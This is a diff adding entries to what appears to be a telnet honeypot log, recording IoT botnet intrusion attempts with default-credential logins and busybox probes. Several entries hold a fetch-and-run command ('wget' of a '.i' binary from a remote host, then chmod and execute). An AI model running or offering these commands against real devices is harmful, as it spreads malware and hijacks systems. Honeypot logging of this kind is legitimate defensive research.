@@ -355,3 +355,113 @@
 2017-02-25 19:50:16,362 - __main__ - INFO - 104.7.14.91:60812: 'ls'
 2017-02-25 19:50:18,680 - __main__ - INFO - 104.7.14.91:60812: 'exit'
 2017-02-25 19:50:18,761 - __main__ - INFO - Lost connection to 104.7.14.91:60812
+2017-02-25 19:51:29,523 - __main__ - INFO - Listening for connections on port 23. CTRL-C to break.
+2017-02-25 19:58:04,277 - __main__ - INFO - Opened connection to 85.133.178.69:37950
+2017-02-25 19:58:05,204 - __main__ - INFO - 85.133.178.69:37950 logged in as root-default
+2017-02-25 19:58:05,487 - __main__ - INFO - 85.133.178.69:37950: 'enable'
+2017-02-25 19:58:05,548 - __main__ - INFO - 85.133.178.69:37950: 'shell'
+2017-02-25 19:58:05,548 - __main__ - INFO - 85.133.178.69:37950: 'sh'
+2017-02-25 19:58:05,838 - __main__ - INFO - 85.133.178.69:37950: 'cat /proc/mounts; /bin/busybox OFODJ'
+2017-02-25 19:58:06,449 - __main__ - INFO - 85.133.178.69:37950: 'cd root@cam12:~#; (cat .s || cp /bin/echo .s); /bin/busybox OFODJ'
+2017-02-25 19:58:06,993 - __main__ - INFO - 85.133.178.69:37950: 'nc; wget; /bin/busybox OFODJ'
+2017-02-25 19:58:07,400 - __main__ - INFO - 85.133.178.69:37950: '(dd bs=52 count=1 if=.s || cat .s)'
+2017-02-25 19:58:07,727 - __main__ - INFO - 85.133.178.69:37950: '/bin/busybox OFODJ'
+2017-02-25 19:58:08,049 - __main__ - INFO - 85.133.178.69:37950: 'rm .s; wget http://<invalid address>/.i; chmod +x .i; ./.i; exit'
+2017-02-25 19:58:08,352 - __main__ - INFO - 85.133.178.69:37950: 'q'
+2017-02-25 19:58:35,781 - __main__ - INFO - Listening for connections on port 23. CTRL-C to break.
+2017-02-25 19:58:49,035 - __main__ - INFO - Opened connection to 178.254.199.126:42521
+2017-02-25 19:59:20,819 - __main__ - INFO - Lost connection to 178.254.199.126:42521
+2017-02-25 20:01:26,879 - __main__ - INFO - Opened connection to 104.7.14.91:32816
+2017-02-25 20:01:28,901 - __main__ - INFO - 104.7.14.91:32816 logged in as root-toor
+2017-02-25 20:01:31,254 - __main__ - INFO - 104.7.14.91:32816: 'rm .s; wget http://<invalid address>/.i; chmod +x .i; ./.i; exit'
+2017-02-25 20:01:57,981 - __main__ - INFO - 104.7.14.91:32816: 'rm .s; wget http://<invalid address>/.i; chmod +x .i;'
+2017-02-25 20:02:21,354 - __main__ - INFO - 104.7.14.91:32816: 'rm .s; wget http://www.google.com/.i; chmod +x .i; ./.i; exit'
+2017-02-25 20:05:10,526 - __main__ - INFO - Listening for connections on port 23. CTRL-C to break.
+2017-02-25 20:05:11,708 - __main__ - INFO - Opened connection to 104.7.14.91:32862
+2017-02-25 20:05:14,014 - __main__ - INFO - 104.7.14.91:32862 logged in as root-toor
+2017-02-25 20:05:17,918 - __main__ - INFO - 104.7.14.91:32862: 'exit'
+2017-02-25 20:05:18,003 - __main__ - INFO - Lost connection to 104.7.14.91:32862
+2017-02-25 20:05:50,294 - __main__ - INFO - Listening for connections on port 23. CTRL-C to break.
+2017-02-25 20:05:52,109 - __main__ - INFO - Opened connection to 104.7.14.91:32864
+2017-02-25 20:05:54,938 - __main__ - INFO - 104.7.14.91:32864 logged in as root-toor
+2017-02-25 20:05:55,483 - __main__ - INFO - 104.7.14.91:32864: 'exic'
+2017-02-25 20:05:56,154 - __main__ - INFO - 104.7.14.91:32864: 'quit'
+2017-02-25 20:05:56,256 - __main__ - INFO - Lost connection to 104.7.14.91:32864
+2017-02-25 20:07:39,631 - __main__ - INFO - Opened connection to 42.113.104.182:46443
+2017-02-25 20:08:13,269 - __main__ - INFO - Lost connection to 42.113.104.182:46443
+2017-02-25 20:10:25,924 - __main__ - INFO - Opened connection to 178.47.99.115:37122
+2017-02-25 20:10:57,457 - __main__ - INFO - Lost connection to 178.47.99.115:37122
+2017-02-25 20:19:07,580 - __main__ - INFO - Opened connection to 39.68.232.57:51508
+2017-02-25 20:19:41,279 - __main__ - INFO - Lost connection to 39.68.232.57:51508
+2017-02-25 20:21:17,686 - __main__ - INFO - Opened connection to 77.105.224.245:47302
+2017-02-25 20:21:18,336 - __main__ - INFO - 77.105.224.245:47302 logged in as admin-1111111
+2017-02-25 20:21:18,514 - __main__ - INFO - 77.105.224.245:47302: 'enable'
+2017-02-25 20:21:18,582 - __main__ - INFO - 77.105.224.245:47302: 'shell'
+2017-02-25 20:21:18,582 - __main__ - INFO - 77.105.224.245:47302: 'sh'
+2017-02-25 20:21:18,759 - __main__ - INFO - 77.105.224.245:47302: 'cat /proc/mounts; /bin/busybox QDONR'
+2017-02-25 20:21:19,152 - __main__ - INFO - 77.105.224.245:47302: 'cd /var; (cat .s || cp /bin/echo .s); /bin/busybox QDONR'
+2017-02-25 20:21:19,563 - __main__ - INFO - 77.105.224.245:47302: 'nc; wget; /bin/busybox QDONR'
+2017-02-25 20:21:19,863 - __main__ - INFO - 77.105.224.245:47302: '(dd bs=52 count=1 if=.s || cat .s)'
+2017-02-25 20:21:20,040 - __main__ - INFO - 77.105.224.245:47302: '/bin/busybox QDONR'
+2017-02-25 20:21:20,254 - __main__ - INFO - 77.105.224.245:47302: 'rm .s; wget http://161.18.225.244:38153/.i; chmod +x .i; ./.i; exit'
+2017-02-25 20:21:21,795 - __main__ - INFO - 77.105.224.245:47302: 'q'
+2017-02-25 20:23:38,559 - __main__ - INFO - Listening for connections on port 23. CTRL-C to break.
+2017-02-25 20:23:44,152 - __main__ - INFO - Opened connection to 104.7.14.91:33074
+2017-02-25 20:23:46,018 - __main__ - INFO - 104.7.14.91:33074 logged in as root-toor
+2017-02-25 20:24:05,545 - __main__ - INFO - 104.7.14.91:33074: 'rm .s; wget http://161.18.225.244:38153/.i; chmod +x .i; ./.i; exit'
+2017-02-25 20:24:57,475 - __main__ - INFO - 104.7.14.91:33074: './.i'
+2017-02-25 20:25:45,670 - __main__ - INFO - Listening for connections on port 23. CTRL-C to break.
+2017-02-25 20:25:46,749 - __main__ - INFO - Opened connection to 104.7.14.91:33076
+2017-02-25 20:25:49,193 - __main__ - INFO - 104.7.14.91:33076 logged in as root-toor
+2017-02-25 20:25:51,123 - __main__ - INFO - 104.7.14.91:33076: 'rm .s; wget http://161.18.225.244:38153/.i; chmod +x .i; ./.i; exit'
+2017-02-25 20:25:55,925 - __main__ - INFO - 104.7.14.91:33076: './1'
+2017-02-25 20:26:03,467 - __main__ - INFO - 104.7.14.91:33076: './.i'
+2017-02-25 20:26:19,825 - __main__ - INFO - 104.7.14.91:33076: '.\/.i'
+2017-02-25 20:26:25,490 - __main__ - INFO - 104.7.14.91:33076: './i'
+2017-02-25 20:26:28,012 - __main__ - INFO - 104.7.14.91:33076: 'ls'
+2017-02-25 20:26:29,474 - __main__ - INFO - 104.7.14.91:33076: './.i'
+2017-02-25 20:26:39,588 - __main__ - INFO - 104.7.14.91:33076: './.i)'
+2017-02-25 20:26:44,506 - __main__ - INFO - 104.7.14.91:33076: './.i'
+2017-02-25 20:26:52,113 - __main__ - INFO - 104.7.14.91:33076: '.i'
+2017-02-25 20:26:54,671 - __main__ - INFO - 104.7.14.91:33076: '/.i'
+2017-02-25 20:26:56,579 - __main__ - INFO - 104.7.14.91:33076: './.i'
+2017-02-25 20:27:03,208 - __main__ - INFO - 104.7.14.91:33076: 'exit'
+2017-02-25 20:27:03,268 - __main__ - INFO - Lost connection to 104.7.14.91:33076
+2017-02-25 20:30:06,724 - __main__ - INFO - Listening for connections on port 23. CTRL-C to break.
+2017-02-25 20:30:09,730 - __main__ - INFO - Opened connection to 104.7.14.91:33090
+2017-02-25 20:30:12,164 - __main__ - INFO - 104.7.14.91:33090 logged in as ./.i-ir
+2017-02-25 20:30:13,543 - __main__ - INFO - 104.7.14.91:33090: './.i'
+2017-02-25 20:30:19,858 - __main__ - INFO - 104.7.14.91:33090: './.i'
+2017-02-25 20:30:24,120 - __main__ - INFO - 104.7.14.91:33090: './.i;'
+2017-02-25 20:30:28,123 - __main__ - INFO - 104.7.14.91:33090: './.i;exit'
+2017-02-25 20:30:28,239 - __main__ - INFO - Lost connection to 104.7.14.91:33090
+2017-02-25 20:30:32,999 - __main__ - INFO - Opened connection to 104.7.14.91:33092
+2017-02-25 20:30:35,422 - __main__ - INFO - 104.7.14.91:33092 logged in as root-toor
+2017-02-25 20:30:37,376 - __main__ - INFO - 104.7.14.91:33092: 'rm .s; wget http://161.18.225.244:38153/.i; chmod +x .i; ./.i; exit'
+2017-02-25 20:31:01,776 - __main__ - INFO - 104.7.14.91:33092: 'ls'
+2017-02-25 20:31:10,454 - __main__ - INFO - 104.7.14.91:33092: 'exit'
+2017-02-25 20:31:10,514 - __main__ - INFO - Lost connection to 104.7.14.91:33092
+2017-02-25 20:31:27,013 - __main__ - INFO - Listening for connections on port 23. CTRL-C to break.
+2017-02-25 20:31:27,993 - __main__ - INFO - Opened connection to 104.7.14.91:33094
+2017-02-25 20:31:30,180 - __main__ - INFO - 104.7.14.91:33094 logged in as root-toor
+2017-02-25 20:31:31,745 - __main__ - INFO - 104.7.14.91:33094: 'rm .s; wget http://161.18.225.244:38153/.i; chmod +x .i; ./.i; exit'
+2017-02-25 20:32:04,945 - __main__ - INFO - 104.7.14.91:33094: 'exit'
+2017-02-25 20:32:05,010 - __main__ - INFO - Lost connection to 104.7.14.91:33094
+2017-02-25 20:33:08,567 - __main__ - INFO - Listening for connections on port 23. CTRL-C to break.
+2017-02-25 20:33:09,709 - __main__ - INFO - Opened connection to 104.7.14.91:33098
+2017-02-25 20:33:12,498 - __main__ - INFO - 104.7.14.91:33098 logged in as root-toor
+2017-02-25 20:33:31,313 - __main__ - INFO - 104.7.14.91:33098: 'rm .s; wget http://161.18.225.244:38153/.i; chmod +x .i; ./.i; exit'
+2017-02-25 20:33:39,134 - __main__ - INFO - 104.7.14.91:33098: 'ls'
+2017-02-25 20:33:44,274 - __main__ - INFO - 104.7.14.91:33098: 'exit'
+2017-02-25 20:33:44,332 - __main__ - INFO - Lost connection to 104.7.14.91:33098
+2017-02-25 20:34:18,071 - __main__ - INFO - Listening for connections on port 23. CTRL-C to break.
+2017-02-25 20:34:26,924 - __main__ - INFO - Opened connection to 104.7.14.91:33106
+2017-02-25 20:34:28,442 - __main__ - INFO - 104.7.14.91:33106 logged in as root-toor
+2017-02-25 20:34:29,731 - __main__ - INFO - 104.7.14.91:33106: 'rm .s; wget http://161.18.225.244:38153/.i; chmod +x .i; ./.i; exit'
+2017-02-25 20:34:36,429 - __main__ - INFO - 104.7.14.91:33106: 'exit'
+2017-02-25 20:34:36,489 - __main__ - INFO - Lost connection to 104.7.14.91:33106
+2017-02-25 20:35:09,541 - __main__ - INFO - Listening for connections on port 23. CTRL-C to break.
+2017-02-25 20:35:19,245 - __main__ - INFO - Opened connection to 104.7.14.91:33108
+2017-02-25 20:35:21,164 - __main__ - INFO - 104.7.14.91:33108 logged in as root-toor
+2017-02-25 20:35:22,551 - __main__ - INFO - 104.7.14.91:33108: 'rm .s; wget http://161.18.225.244:38153/.i; chmod +x .i; ./.i; exit'
+2017-02-25 20:35:24,150 - __main__ - INFO - Lost connection to 104.7.14.91:33108
